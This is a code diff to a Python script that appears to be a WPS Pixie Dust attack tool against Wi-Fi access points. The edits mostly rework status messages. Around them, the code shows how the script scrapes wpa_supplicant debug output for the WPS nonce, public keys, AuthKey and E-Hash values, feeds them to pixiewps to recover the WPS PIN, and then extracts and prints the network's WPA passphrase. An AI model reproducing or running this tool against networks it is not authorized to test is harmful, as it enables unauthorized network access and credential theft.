@@ -87,7 +87,6 @@ def recvuntil(pipe, what):
 
 
 def statechange(data, old, new):
-    print('{} -> {}'.format(old, new))
     data.state = new
     return True
 
@@ -107,30 +106,38 @@ def process_wpa_supplicant(pipe, options, data):
     if options.verbose: sys.stderr.write(line + '\n')
 
     if line.startswith('WPS: '):
-        if 'Enrollee Nonce' in line and 'hexdump' in line:
+        if 'Building Message M' in line:
+            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
+            print('[*] Sending WPS Message {}...'.format(data.state))
+        elif 'Received M' in line:
+            statechange(data, data.state, 'M' + line.split('Received M')[1])
+            print('[*] Received WPS Message {}'.format(data.state))
+        elif 'Enrollee Nonce' in line and 'hexdump' in line:
             data.e_nonce = get_hex(line)
             assert(len(data.e_nonce) == 16*2)
+            if options.pixiemode: print('[P] E-Nonce: {}'.format(data.e_nonce))
         elif 'DH own Public Key' in line and 'hexdump' in line:
             data.pkr = get_hex(line)
             assert(len(data.pkr) == 192*2)
+            if options.pixiemode: print('[P] PKR: {}'.format(data.pkr))
         elif 'DH peer Public Key' in line and 'hexdump' in line:
             data.pke = get_hex(line)
             assert(len(data.pke) == 192*2)
+            if options.pixiemode: print('[P] PKE: {}'.format(data.pke))
         elif 'AuthKey' in line and 'hexdump' in line:
             data.authkey = get_hex(line)
             assert(len(data.authkey) == 32*2)
+            if options.pixiemode: print('[P] AuthKey: {}'.format(data.authkey))
         elif 'E-Hash1' in line and 'hexdump' in line:
             data.e_hash1 = get_hex(line)
             assert(len(data.e_hash1) == 32*2)
+            if options.pixiemode: print('[P] E-Hash1: {}'.format(data.e_hash1))
         elif 'E-Hash2' in line and 'hexdump' in line:
             data.e_hash2 = get_hex(line)
             assert(len(data.e_hash2) == 32*2)
+            if options.pixiemode: print('[P] E-Hash2: {}'.format(data.e_hash2))
         elif 'Network Key' in line and 'hexdump' in line:
             data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
-        elif 'Building Message M' in line:
-            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
-        elif 'Received M' in line:
-            statechange(data, data.state, 'M' + line.split('Received M')[1])
 
     elif ': State: ' in line:
         statechange(data, *line.split(': State: ')[1].split(' -> '))
@@ -144,16 +151,22 @@ def process_wpa_supplicant(pipe, options, data):
         print("[ERROR]: unexpected interference - kill NetworkManager/wpa_supplicant!")
         #return False
     elif 'Trying to authenticate with' in line:
-        print(line)
-    elif 'Authentication response' in line:
-        print(line)
-    elif 'Trying to associate with' in line:
-        print(line)
         options.essid = line.split("'")[1]
+        print('[*] Authenticating...')
+    elif 'Authentication response' in line:
+        print('[+] Authenticated')
+    elif 'Trying to associate with' in line:
+        options.essid = line.split("'")[1]
+        print('[*] Associating with AP...')
     elif 'Associated with' in line:
-        print(line)
+        print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
     elif 'EAPOL: txStart' in line:
-        print(line)
+        statechange(data, data.state, 'EAPOL Start')
+        print('[*] Sending EAPOL Start...')
+    elif 'EAP entering state IDENTITY' in line:
+        print('[*] Received Identity Request')
+    elif 'using real identity' in line:
+        print('[*] Sending Identity Response...')
 
     return True
 
@@ -233,6 +246,7 @@ if __name__ == '__main__':
     data = Data()
     wpas = run_wpa_supplicant(options)
 
+    print('[*] Trying pin "{}"...'.format(options.pin))
     if not wps_reg(options):
         cleanup(wpas, options)
         die('Error while launching wpa_cli')
@@ -255,7 +269,7 @@ if __name__ == '__main__':
         out = shellcmd(pixiecmd)
         print(out)
         a = parse_pixiewps(out)
-        if a:
+        if a and a != '<empty>':
             print('Trying to get password with the correct pin...')
             cleanup(wpas, options)
             wpas = run_wpa_supplicant(options)
@@ -268,10 +282,10 @@ if __name__ == '__main__':
             except KeyboardInterrupt:
                 print("\nAborting...")
             if data.wpa_psk:
+                cleanup(wpas, options)
                 print("[+] WPS PIN: {}".format(options.pin))
                 print("[+] WPA PSK: {}".format(data.wpa_psk))
                 print("[+] AP SSID: {}".format(options.essid))
-                cleanup(wpas, options)
                 sys.exit(0)
             cleanup(wpas, options)
             sys.exit(1)
